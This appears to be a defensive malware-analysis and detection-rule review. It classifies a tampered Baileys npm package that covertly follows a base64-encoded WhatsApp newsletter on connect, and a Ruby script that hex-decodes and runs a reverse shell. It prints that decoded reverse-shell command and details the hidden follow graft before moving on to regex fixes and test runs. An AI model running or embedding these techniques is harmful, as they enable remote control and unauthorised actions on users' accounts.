2562c4803aea40671056867771ee7eef9b94350d98dbb956b659b789634a25f5
@elfhkry666-baileys-0.3.24.tgz: MALICIOUS

Each archive contains only package/lib/Socket/newsletter.js (10,310 bytes).
Both members have SHA-256
4bbd58b7071236c9d63a369c417d359381828f13857d737a20edb151c369613e.
No publish manifest or imported dependency modules are supplied. The version
identity comes from the supplied artifact names, not an independently verified
manifest. Neither archive can load as a complete npm library on its own.

The module implements a Baileys newsletter socket: it creates a groups socket,
wraps genericExecuteWMexQuery, and exposes caller-directed create, update,
metadata, follow/unfollow, mute/unmute, reaction, message-read, live-update,
admin, ownership, demotion, and deletion APIs. These are consistent with its
ordinary purpose and do not themselves establish theft, remote commands,
persistence, execution of downloaded code, or spam.

The injected behavior is in makeNewsletterSocket, lines 55-66. It registers
sock.ev.on('connection.update', ...). The first connection === 'open' sets
isStreamSynced before the try, so this socket instance attempts the action
once and does not retry it on a later reconnect or error. It decodes
MTIwMzYzNDEzMzgxOTY0MzU2QG5ld3NsZXR0ZXI= as
120363413381964356@newsletter, binds that value to _t, and awaits
executeWMexQuery({newsletter_id: _t}, QueryIds.FOLLOW,
XWAPaths.xwa2_newsletter_join_v2). The local wrapper passes those arguments,
the socket's query function, and generateMessageTag to the imported generic
query implementation. Its empty catch discards failures. The existing public
newsletterFollow(jid) API separately forwards a caller-supplied JID through
the same FOLLOW operation.

The encoded fixed target, automatic authenticated-session trigger, absence of
a caller-provided target or opt-in in this branch, and discarded errors tip
the judgment toward an unauthorized engagement graft. No external scanner,
feed, or advisory was used as proof. Missing dependencies limit evidence of
runtime success; they do not change the effects expressed by the code.
No external requests or actual follows were performed during this review.

6a603c85ce411e5f10d6f9c02e1c32144db4f2f1e588bfc00c13d6d85b32812c
ruby-hex-stage.rb: MALICIOUS

The entire program is one top-level Kernel.system call with a single command
string. Its pipeline echoes an inline hex literal, decodes it with xxd -r -p,
and feeds the decoded bytes to sh. Decoding without executing gives:
  bash -i >& /dev/tcp/192.0.2.123/4444 0>&1
The command attempts an interactive reverse shell: the outbound TCP pseudo-
device receives stdout/stderr and fd 0 is duplicated from fd 1. It runs the
pipeline rather than printing an inert example. Ruby and the decoded Bash
both pass syntax checks. No actual payload execution or connection was made.

The fixed endpoint is in a documentation address range. That and the tiny
example-like shape make an educational fixture plausible; deployment purpose
and authorization are absent. The balance still favors MALICIOUS because the
supplied executable is solely concealed reverse-shell activation. Runtime
success depends on the invoking sh's redirection support, a suitable Bash,
xxd availability and connectivity. No extra stage, survey, persistence,
credential acquisition, privilege escalation, or cleanup exists in its bytes.

Its two hostile findings describe the reverse shell. Existing notable traits
cover process execution, xxd decoding, interpreter stdin, shell interaction
and descriptor redirection; suspicious traits cover encoded execution and the
encoded reverse-shell command. Three distinct hostile behaviors cannot be
justified. We examined the host call, whole decoded command and pipe/redirection
relationships; none remains undetected. The remaining primitives are dual-use
or concealment and do not merit an extra hostile alias. No matcher limitation
prevents a supported additional hostile objective: there is no evidence for one.

Rule changes and retained coverage

The old whatsapp-follow-call-error-swallowed regex matched any
executeWMexQuery token within 160 bytes of an empty catch. A metadata read
therefore incorrectly activated two hostile follow composites when a channel
literal and connection-open wiring were present. It also matched unrelated
later catches and quoted examples. Replace it with a tree query requiring a
real follow invocation in the try body associated with the empty catch.
For WMex calls, the second argument must be a FOLLOW member/identifier.
The query observes a lexical guard, without claiming that an unawaited promise
rejection is caught. Awaited/direct calls, member calls, spaced member access,
JavaScript, TypeScript and IgnoreResponse variants are covered.

Relocate the result to micro-behaviors/data/control-flow/error-handling as
whatsapp-follow-empty-catch-guard. The required relationship is the error guard;
its old messaging/channel placement described its operand instead of the
observed operation. Promote component to notable: this is a complete, useful
error-handling observation. Update both objective consumers. Rename the social
and fork composites from swallowed-roster to swallowed-errors, because neither
requires several channels. Preserve their hostile severity and fixed-target
logic. Change the Base64-suffix description to a neutral encoded-data claim.

A second benign control with newsletter_id: "FOLLOW" and QueryIds.METADATA
exposed overmatching in whatsapp-newsletter-follow-query and
whatsapp-newsletter-follow-token-target. Require the FOLLOW selector after an
argument comma; the target object must close before that selector. Keep source-
text matching and describe it as call syntax because runtime-patch consumers
also inspect complete replacement modules embedded in strings. Keep all
accurate observations of legitimate follow operations.

Before narrowing, inspect both explicit guard consumers, all query/token
consumers in social and runtime-patch rules, and ancestor directory selectors.
No neutral source/destination directory selector consumes the moved guard.
The ancestor objectives/impact selector is an exclusion in CrystalX; preserved
truth for real social follows leaves that membership unchanged.

Verification

Run check.py with a scratch destination outside testdata: all 15 controls pass.
They include original shared positive fixtures outside this batch:
- taxonomy/whatsapp-default-follow/roster-connect-follow-positive.js
- taxonomy/baileys-connect-follow-triage/connect-hardcoded-follow.js
- baileys-connect-follow-mute/positive-hardcoded-follow-mute.js

For query/token narrowing, compare all 28 JS/TS testdata files matching either
old regex. All detections in 27 files remain identical. The only changed file
is the new metadata-label-follow.js benign control: three hostile, one
suspicious and four notable false follow findings disappear. The earlier guard
correction separately removes its two false hostile guard-based findings.
A synthetic control alone was not used to erase a technique; shared positive
follow, timer, remote-list, aliased, parameterized and source-syntax
coverage remains present.

Run atomscan --no-update --analyze local --mode slow -f json on each original
artifact before and after, and cleave facts on all originals and both members.
Final numerical comparison is in results.json. Old guard and two hostile IDs
are replaced by their corrected IDs, without losing behavior on any supplied
sample. No trait changes were needed for the Ruby sample.

The full-artifact model outputs agree with MALICIOUS and do not change. The
newsletter member's calibrated ML level remains -1 despite five supported
hostile findings and p approximately 0.9857. That is a remaining member-model
calibration disagreement, not grounds to restore false traits. Atomscan also
reports its older feature-spec version (18 versus expected 21). Engine/model
changes are outside this YAML review. Static reports record limited source
flow for the imported query implementation; the explicit caller path was
manually traced as described above. No material attack coverage is lost.
